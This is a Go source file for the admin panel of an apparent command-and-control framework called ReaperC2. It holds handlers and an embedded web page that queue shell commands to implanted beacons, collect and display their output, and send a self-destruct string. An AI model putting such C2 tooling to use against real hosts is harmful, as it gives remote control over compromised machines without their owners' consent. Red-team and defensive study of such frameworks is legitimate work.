package adminpanel

import (
	"context"
	"encoding/json"
	"html/template"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"ReaperC2/pkg/dbconnections"

	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/mongo"
)

const maxQueuedCommandLen = 8000

// beaconSelfDestructCommand is queued for Scythe to exit on next heartbeat delivery.
const beaconSelfDestructCommand = "sendmetojesusdog"

func beaconSelectLabel(c dbconnections.BeaconClientDocument) string {
	label := strings.TrimSpace(c.BeaconLabel)
	if label == "" {
		if len(c.ClientId) > 8 {
			return c.ClientId[:8] + "…"
		}
		return c.ClientId
	}
	return label
}

func (s *Server) handleCommandsPage(w http.ResponseWriter, r *http.Request) {
	user, role, ok := s.requireHTMLAuth(w, r)
	if !ok {
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 15*time.Second)
	defer cancel()
	clients, err := dbconnections.ListBeaconClients(ctx)
	if err != nil {
		log.Printf("admin: list clients for commands: %v", err)
		http.Error(w, "failed to load beacons", http.StatusInternalServerError)
		return
	}
	var opts strings.Builder
	for _, c := range clients {
		lbl := beaconSelectLabel(c)
		opts.WriteString(`<option value="`)
		opts.WriteString(template.HTMLEscapeString(c.ClientId))
		opts.WriteString(`">`)
		opts.WriteString(template.HTMLEscapeString(lbl + " — " + c.ClientId))
		opts.WriteString(`</option>`)
	}
	if opts.Len() == 0 {
		opts.WriteString(`<option value="">(no beacons — generate one under Beacons)</option>`)
	}

	body := `
<h1>Beacon commands</h1>
<p class="muted">Queue shell-style commands for a beacon. They are returned on the next <code>GET /heartbeat/&lt;uuid&gt;</code> and cleared when delivered (same as the <code>Commands</code> array on the client document). When the beacon posts results to <code>POST /receive/&lt;uuid&gt;</code>, output is stored below for review.</p>
<div class="card">
  <h2>Queue a command</h2>
  <label>Beacon</label>
  <select id="beaconSel">` + opts.String() + `</select>
  <label>Command</label>
  <textarea id="cmdText" placeholder="e.g. whoami" rows="4"></textarea>
  <button type="button" class="btn" id="queueBtn">Queue command</button>
  <p id="cmdMsg" class="muted" style="margin-top:.75rem"></p>
</div>
<div class="card">
  <h2>Pending queues</h2>
  <p class="muted">Commands waiting for the next heartbeat per beacon.</p>
  <div id="pendingWrap"><p class="muted">Loading…</p></div>
  <button type="button" class="btn btn-secondary" id="refPending">Refresh</button>
</div>
<div class="card">
  <h2>Command output history</h2>
  <p class="muted">Stored results from the beacon (newest first). Same data as the <code>data</code> collection for that <code>ClientId</code>.</p>
  <label>Beacon</label>
  <select id="histSel">` + opts.String() + `</select>
  <button type="button" class="btn" id="loadHist">Load history</button>
  <button type="button" class="btn btn-secondary" id="refHist">Refresh</button>
  <div id="histWrap" style="margin-top:1rem"><p class="muted">Choose a beacon and load history.</p></div>
</div>
<script>
function renderPending(data) {
  var el = document.getElementById('pendingWrap');
  if (!data.beacons || data.beacons.length === 0) {
    el.innerHTML = '<p class="muted">No beacons registered.</p>';
    return;
  }
  var html = '<table><thead><tr><th>Beacon</th><th>Client ID</th><th>Pending</th></tr></thead><tbody>';
  for (var i = 0; i < data.beacons.length; i++) {
    var b = data.beacons[i];
    var pend = (b.pending && b.pending.length) ? b.pending.map(function(c) { return escapeHtml(c); }).join('<br>') : '<span class="muted">—</span>';
    html += '<tr><td>' + escapeHtml(b.label) + '</td><td class="mono">' + escapeHtml(b.client_id) + '</td><td style="font-size:.85rem">' + pend + '</td></tr>';
  }
  html += '</tbody></table>';
  el.innerHTML = html;
}
function escapeHtml(s) {
  var d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}
async function loadPending() {
  var r = await fetch('/api/beacon-commands', { credentials: 'same-origin' });
  var j = await r.json().catch(function() { return {}; });
  if (!r.ok) { document.getElementById('pendingWrap').innerHTML = '<p class="muted">' + (j.error || r.statusText) + '</p>'; return; }
  renderPending(j);
}
document.getElementById('queueBtn').onclick = async function() {
  var sel = document.getElementById('beaconSel');
  var cid = sel.value;
  var msg = document.getElementById('cmdMsg');
  msg.textContent = '';
  if (!cid) { msg.textContent = 'Select a beacon.'; return; }
  var cmd = document.getElementById('cmdText').value;
  if (!cmd.trim()) { msg.textContent = 'Enter a command.'; return; }
  var r = await fetch('/api/beacon-commands', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ client_id: cid, command: cmd }) });
  var j = await r.json().catch(function() { return {}; });
  if (r.ok) {
    msg.textContent = 'Queued.';
    document.getElementById('cmdText').value = '';
    loadPending();
    if (document.getElementById('histSel').value === cid) { loadCommandHistory(); }
  } else {
    msg.textContent = j.error || r.statusText;
  }
};
document.getElementById('refPending').onclick = function() { loadPending(); };
loadPending();
async function loadCommandHistory() {
  var cid = document.getElementById('histSel').value;
  var el = document.getElementById('histWrap');
  if (!cid) { el.innerHTML = '<p class="muted">Select a beacon.</p>'; return; }
  el.innerHTML = '<p class="muted">Loading…</p>';
  var r = await fetch('/api/beacon-command-output?client_id=' + encodeURIComponent(cid) + '&limit=200', { credentials: 'same-origin' });
  var j = await r.json().catch(function() { return {}; });
  if (!r.ok) { el.innerHTML = '<p class="muted">' + (j.error || r.statusText) + '</p>'; return; }
  if (!j.entries || j.entries.length === 0) {
    el.innerHTML = '<p class="muted">No stored output for this beacon yet.</p>';
    return;
  }
  var html = '<table class="cmd-history-table"><thead><tr><th>Time (UTC)</th><th>Command</th><th>Output</th></tr></thead><tbody>';
  for (var i = 0; i < j.entries.length; i++) {
    var e = j.entries[i];
    html += '<tr><td class="mono" style="white-space:nowrap;font-size:.8rem">' + escapeHtml(e.timestamp) + '</td><td><pre class="mono" style="margin:0;max-height:120px;overflow:auto;white-space:pre-wrap">' + escapeHtml(e.command) + '</pre></td><td><pre class="mono cmd-history-out">' + escapeHtml(e.output) + '</pre></td></tr>';
  }
  html += '</tbody></table>';
  el.innerHTML = html;
}
document.getElementById('loadHist').onclick = function() { loadCommandHistory(); };
document.getElementById('refHist').onclick = function() { loadCommandHistory(); };
</script>`
	s.writeAppPage(w, user, role, "commands", "Commands", body)
}

func (s *Server) handleAPIBeaconCommands(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		s.handleAPIBeaconCommandsGET(w, r)
	case http.MethodPost:
		s.handleAPIBeaconCommandsPOST(w, r)
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (s *Server) handleAPIBeaconCommandsGET(w http.ResponseWriter, r *http.Request) {
	if _, _, ok := s.sessionUser(r); !ok {
		jsonError(w, http.StatusUnauthorized, "unauthorized")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 15*time.Second)
	defer cancel()
	clients, err := dbconnections.ListBeaconClients(ctx)
	if err != nil {
		jsonError(w, http.StatusInternalServerError, "failed")
		return
	}
	type row struct {
		ClientID string   `json:"client_id"`
		Label    string   `json:"label"`
		Pending  []string `json:"pending"`
	}
	var out []row
	for _, c := range clients {
		pending := c.Commands
		if pending == nil {
			pending = []string{}
		}
		out = append(out, row{
			ClientID: c.ClientId,
			Label:    beaconSelectLabel(c),
			Pending:  pending,
		})
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{"beacons": out})
}

type enqueueCommandRequest struct {
	ClientID string `json:"client_id"`
	Command  string `json:"command"`
}

func (s *Server) handleAPIBeaconCommandsPOST(w http.ResponseWriter, r *http.Request) {
	actor, _, ok := s.sessionUser(r)
	if !ok {
		jsonError(w, http.StatusUnauthorized, "unauthorized")
		return
	}
	var req enqueueCommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid json")
		return
	}
	req.ClientID = strings.TrimSpace(req.ClientID)
	req.Command = strings.TrimSpace(req.Command)
	if req.ClientID == "" || req.Command == "" {
		jsonError(w, http.StatusBadRequest, "client_id and command required")
		return
	}
	if utf8.RuneCountInString(req.Command) > maxQueuedCommandLen {
		jsonError(w, http.StatusBadRequest, "command too long")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 10*time.Second)
	defer cancel()
	err := dbconnections.AppendBeaconCommands(ctx, req.ClientID, []string{req.Command})
	if err != nil {
		if err == mongo.ErrNoDocuments {
			jsonError(w, http.StatusNotFound, "beacon not found")
			return
		}
		log.Printf("admin: queue command: %v", err)
		jsonError(w, http.StatusInternalServerError, "queue failed")
		return
	}
	if err := dbconnections.InsertAuditLog(ctx, actor, dbconnections.AuditActionBeaconCommandQueued, bson.M{
		"client_id": req.ClientID,
		"length":    utf8.RuneCountInString(req.Command),
	}); err != nil {
		log.Printf("admin: audit command queue: %v", err)
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "queued"})
}

func (s *Server) handleAPIBeaconCommandOutput(w http.ResponseWriter, r *http.Request) {
	if _, _, ok := s.sessionUser(r); !ok {
		jsonError(w, http.StatusUnauthorized, "unauthorized")
		return
	}
	clientID := strings.TrimSpace(r.URL.Query().Get("client_id"))
	if clientID == "" {
		jsonError(w, http.StatusBadRequest, "client_id required")
		return
	}
	limit := int64(100)
	if v := r.URL.Query().Get("limit"); v != "" {
		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 && n <= 500 {
			limit = n
		}
	}
	ctx, cancel := context.WithTimeout(r.Context(), 20*time.Second)
	defer cancel()
	exists, err := dbconnections.BeaconClientExists(ctx, clientID)
	if err != nil {
		log.Printf("admin: beacon exists: %v", err)
		jsonError(w, http.StatusInternalServerError, "failed")
		return
	}
	if !exists {
		jsonError(w, http.StatusNotFound, "beacon not found")
		return
	}
	rows, err := dbconnections.ListCommandOutputForClient(ctx, clientID, limit)
	if err != nil {
		log.Printf("admin: list command output: %v", err)
		jsonError(w, http.StatusInternalServerError, "failed")
		return
	}
	type entry struct {
		ID        string `json:"id"`
		Command   string `json:"command"`
		Output    string `json:"output"`
		Timestamp string `json:"timestamp"`
	}
	var entries []entry
	for _, rec := range rows {
		entries = append(entries, entry{
			ID:        rec.ID.Hex(),
			Command:   rec.Command,
			Output:    rec.Output,
			Timestamp: rec.Timestamp.UTC().Format(time.RFC3339),
		})
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]interface{}{
		"client_id": clientID,
		"entries":   entries,
	})
}

type beaconKillRequest struct {
	ClientID string `json:"client_id"`
}

func (s *Server) handleAPIBeaconKill(w http.ResponseWriter, r *http.Request) {
	actor, _, ok := s.sessionUser(r)
	if !ok {
		jsonError(w, http.StatusUnauthorized, "unauthorized")
		return
	}
	var req beaconKillRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, http.StatusBadRequest, "invalid json")
		return
	}
	req.ClientID = strings.TrimSpace(req.ClientID)
	if req.ClientID == "" {
		jsonError(w, http.StatusBadRequest, "client_id required")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 10*time.Second)
	defer cancel()
	err := dbconnections.AppendBeaconCommands(ctx, req.ClientID, []string{beaconSelfDestructCommand})
	if err != nil {
		if err == mongo.ErrNoDocuments {
			jsonError(w, http.StatusNotFound, "beacon not found")
			return
		}
		log.Printf("admin: beacon kill queue: %v", err)
		jsonError(w, http.StatusInternalServerError, "queue failed")
		return
	}
	if err := dbconnections.InsertAuditLog(ctx, actor, dbconnections.AuditActionBeaconKillQueued, bson.M{
		"client_id": req.ClientID,
		"command":   beaconSelfDestructCommand,
	}); err != nil {
		log.Printf("admin: audit beacon kill: %v", err)
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "queued", "command": beaconSelfDestructCommand})
}
